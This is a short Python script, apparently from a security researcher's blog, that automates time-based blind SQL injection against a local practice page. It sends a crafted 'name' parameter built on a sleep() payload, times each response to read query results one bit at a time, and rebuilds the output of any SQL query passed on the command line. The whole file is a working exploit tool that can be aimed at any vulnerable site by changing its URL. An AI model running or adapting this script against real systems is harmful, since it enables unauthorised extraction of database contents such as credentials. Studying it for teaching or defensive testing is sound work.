#!/usr/bin/env python
"""
    Automated blind SQLi automated
    DiabloHorn https://diablohorn.wordpress.com
"""

import requests
from random import randint
import time
import sys

BASE_URL = "http://localhost/pwnme-plain.php"
BASE_QUERY = "root' and 1=if(substring({},{},1)=TRUE,sleep(1),2)-- "
URL_PARAMS = {'name':None}
BASE_TIME = 0

def get_timing():
    times = list()
    print "Calculating average times"
    for i in range(10):
        URL_PARAMS['name'] = 'root'
        r = requests.get(BASE_URL,params=URL_PARAMS)
        times.append(r.elapsed.seconds)
        time.sleep(randint(1,3))
        print r.elapsed.seconds
    print "Average: %s" % (sum(times) / len(times))
    return (sum(times) / len(times))

def get_query_result(data):
    global URL_PARAMS
    reqtime = 0
    
    URL_PARAMS['name'] = data
    r = requests.get(BASE_URL, params=URL_PARAMS)
    reqtime = r.elapsed.seconds
    pagecontent = r.text
    if reqtime > BASE_TIME:
        return True
    else:
        return False

def getbyte(query):
    bytestring = ""
    for i in range(1,9):
        if get_query_result(BASE_QUERY.format(query,i)):
            bytestring += "1"
        else:
            bytestring += "0"
    return int(bytestring,2)

def querylength(query):
    return getbyte("lpad(bin(length(({}))),8,'0')".format(query))
    
def execquery(query):
    fulltext = ""
    qlen = querylength(query) + 1
    print "Retrieving {} bytes".format(qlen-1)
    for i in range(1,qlen):
        sys.stdout.write(chr(getbyte("lpad(bin(ascii(substring(({}),{},1))),8,'0')".format(query,i))))
        sys.stdout.flush()
    print ""
        
if __name__ == "__main__":    
    if len(sys.argv) != 2:
        print sys.argv[0] + " \"select @@version\""
        sys.exit()
    
    BASE_TIME = get_timing()
    execquery(sys.argv[1])
